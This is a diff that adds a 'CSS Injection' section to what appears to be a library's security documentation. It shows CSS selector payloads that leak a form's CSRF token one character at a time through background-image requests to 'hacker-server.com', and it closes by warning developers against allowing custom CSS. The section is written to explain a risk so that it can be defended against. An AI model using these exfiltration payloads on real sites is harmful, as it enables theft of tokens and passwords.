@@ -86,3 +86,39 @@ if (getPropertySafe(
     // ...
 }
 ```
+
+## CSS Injection
+As we have these CSS Selectors:
+- `[href^="a"]` means element that has attribute `href` starts with `a`.
+- `[href*="a"]` means element that has attribute `href` contains `a`.
+- `[href$="a"]` means element that has attribute `href` ends with `a`.
+
+Therefore, we can fetch [csrf tokens](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF#csrf_tokens) or passwords via injected CSS:
+```CSS
+form:has(input[name="csrf"][value^="a"]){
+    background-image: url("hacker-server.com?csrf=a");
+}
+form:has(input[name="csrf"][value^="b"]){
+    background-image: url("hacker-server.com?csrf=b");
+}
+form:has(input[name="csrf"][value^="c"]){
+    background-image: url("hacker-server.com?csrf=c");
+}
+...
+```
+Moreover, if you can automatically update the CSS without reload the page:
+```CSS
+/* We assumed that your server gets the "hacker-server.com?csrf=a" request */
+form:has(input[name="csrf"][value^="aa"]){
+    background-image: url("hacker-server.com?csrf=aa");
+}
+form:has(input[name="csrf"][value^="ab"]){
+    background-image: url("hacker-server.com?csrf=ab");
+}
+form:has(input[name="csrf"][value^="ac"]){
+    background-image: url("hacker-server.com?csrf=ac");
+}
+...
+```
+
+Therefore, we suggested that developers should never allows custom CSS or variable CSS. Use the `secure.createBlankObject` to avoid prototype pollution if you want to use the `CO.style` syntax.
